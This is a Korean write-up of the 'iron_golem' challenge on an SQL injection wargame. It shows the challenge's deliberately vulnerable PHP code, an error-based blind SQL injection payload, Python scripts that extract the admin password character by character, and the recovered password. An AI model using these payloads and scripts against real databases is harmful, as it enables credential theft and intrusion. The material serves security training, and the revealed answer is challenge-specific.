# iron_golem

## 1. Code
```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `sleep`, `benchmark`를 필터링한다.
- 쿼리만을 보여주고, id값을 보여주지 않는다.
- 에러 발생시, 에러 화면을 띄워준다.
&rarr; 기존과 동일한 blind-sqli지만, "Hello admin"이 아닌 에러화면을 통해 조건문을 검증해야 한다.

## 3. Solution
먼저 공격 쿼리를 설계해 보았다.   

참, 거짓을 에러 화면으로 구분하는 것이 목적이다.   
`if`문을 포함한 서브 쿼리를 이용하여 짜보았다.   
구성은 다음과 같다.   

```sql
SELECT IF(조건문,참,거짓(에러))
```

변수명 | 값
---|---
`pw` | 1234' or (SELECT IF(`조건문`,1,(SELECT 1 UNION SELECT 2)))#   



#### a. 길이 구하기
>    `length`함수를 이용하여 길이를 구하였다.
```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,101):
    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?\
            pw=1234' or (SELECT IF(length(pw)=%d,1,(SELECT 1 UNION SELECT 2)))%%23" % i
    res = requests.get(url, cookies=cookie)

    if not "Subquery returns more than 1 row" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```   
>    실행 결과는 다음과 같다.
```
Length of pw : 32
```   


#### b. 값 구하기
>    `ascii`와 `substr`함수를 이용하였다.
    `a. 길이 구하기`의 코드 뒤에 붙여 주었다.
```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,101):
    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?\
            pw=1234' or (SELECT IF(length(pw)=%d,1,(SELECT 1 UNION SELECT 2)))%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if not "Subquery returns more than 1 row" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?\
                pw=1234' or (SELECT IF(ascii(substr(pw,%d,1))=%d,1,(SELECT 1 UNION SELECT 2)))%%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if not "Subquery returns more than 1 row" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```   
>    실행 결과는 다음과 같다.
```
Length of pw : 32
pw(1) : 0
pw(2) : 06
pw(3) : 06b
pw(4) : 06b5
pw(5) : 06b5a
pw(6) : 06b5a6
pw(7) : 06b5a6c
pw(8) : 06b5a6c1
pw(9) : 06b5a6c16
pw(10) : 06b5a6c16e
pw(11) : 06b5a6c16e8
pw(12) : 06b5a6c16e88
pw(13) : 06b5a6c16e883
pw(14) : 06b5a6c16e8830
pw(15) : 06b5a6c16e88304
pw(16) : 06b5a6c16e883047
pw(17) : 06b5a6c16e8830475
pw(18) : 06b5a6c16e8830475f
pw(19) : 06b5a6c16e8830475f9
pw(20) : 06b5a6c16e8830475f98
pw(21) : 06b5a6c16e8830475f983
pw(22) : 06b5a6c16e8830475f983c
pw(23) : 06b5a6c16e8830475f983cc
pw(24) : 06b5a6c16e8830475f983cc3
pw(25) : 06b5a6c16e8830475f983cc3a
pw(26) : 06b5a6c16e8830475f983cc3a8
pw(27) : 06b5a6c16e8830475f983cc3a82
pw(28) : 06b5a6c16e8830475f983cc3a825
pw(29) : 06b5a6c16e8830475f983cc3a825e
pw(30) : 06b5a6c16e8830475f983cc3a825ee
pw(31) : 06b5a6c16e8830475f983cc3a825ee9
pw(32) : 06b5a6c16e8830475f983cc3a825ee9a
```   

나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.
변수명 | 값
---|---
`pw` | 06b5a6c16e8830475f983cc3a825ee9a